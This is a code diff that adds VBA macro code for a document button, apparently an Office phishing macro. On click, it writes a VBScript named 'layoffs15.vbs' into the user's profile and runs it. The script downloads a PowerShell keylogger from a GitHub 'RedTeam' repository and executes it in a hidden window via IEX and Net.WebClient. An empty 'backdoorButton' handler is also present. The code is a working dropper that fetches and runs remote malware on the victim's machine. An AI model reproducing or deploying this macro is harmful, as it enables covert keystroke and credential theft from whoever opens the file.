@@ -1,0 +1,45 @@
+ Private Sub CommandButton1_Click()
+    Dim myoutputfile As Integer
+    Dim FilePath As String
+    Set oShell = CreateObject("WScript.Shell")
+    userProfilePath = oShell.ExpandEnvironmentStrings("%UserProfile%")
+
+    myFile = userProfilePath + "\layoffs15.vbs"
+    myoutputfile = FreeFile
+    Open myFile For Output As #myoutputfile
+    Print #myoutputfile, "HTTPDownload ""https://raw.githubusercontent.com/FerdiGul/RedTeam/main/keylogger.ps1"", """ & userProfilePath & """"; ""
+    Print #myoutputfile, "Sub HTTPDownload( myURL, myPath )"
+    Print #myoutputfile, "     Dim i, objFile, objFSO, objHTTP, strFile, strMsg"
+    Print #myoutputfile, "     Const ForReading = 1, ForWriting = 2, ForAppending = 8"
+    Print #myoutputfile, "     Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
+    Print #myoutputfile, "     If objFSO.FolderExists(myPath) Then"
+    Print #myoutputfile, "          strFile = objFSO.BuildPath(myPath, Mid(myURL, InStrRev(myURL, ""/"") + 1))"
+    Print #myoutputfile, "     ElseIf objFSO.FolderExists(Left(myPath, InStrRev(myPath, "" \ "") - 1)) Then"
+    Print #myoutputfile, "          strFile = myPath"
+    Print #myoutputfile, "     Else"
+    Print #myoutputfile, "          WScript.Echo ""ERROR: Target folder not found."""
+    Print #myoutputfile, "          Exit Sub"
+    Print #myoutputfile, "     End If"
+    Print #myoutputfile, "     Set objFile = objFSO.OpenTextFile(strFile, ForWriting, True)"
+    Print #myoutputfile, "     Set objHTTP = CreateObject(""WinHttp.WinHttpRequest.5.1"")"
+    Print #myoutputfile, "     objHTTP.Open ""GET"", myURL, False"
+    Print #myoutputfile, "     objHTTP.Send"
+    Print #myoutputfile, "     For i = 1 To LenB(objHTTP.ResponseBody)"
+    Print #myoutputfile, "          objFile.Write Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)))"
+    Print #myoutputfile, "     Next"
+    Print #myoutputfile, "     objFile.Close( )"
+    Print #myoutputfile, "     Set WshShell = WScript.CreateObject(""WScript.Shell"")"
+Print #myoutputfile, "     WshShell.Run """"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"""" IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FerdiGul/RedTeam/main/keylogger.ps1')"",2 "
+
+    Print #myoutputfile, "End Sub"
+    Close #myoutputfile
+    Shell Replace("wscript ""FILE"" ", "FILE", myFile)
+End Sub
+
+ 
+
+Private Sub backdoorButton_Click()
+
+ 
+
+End Sub
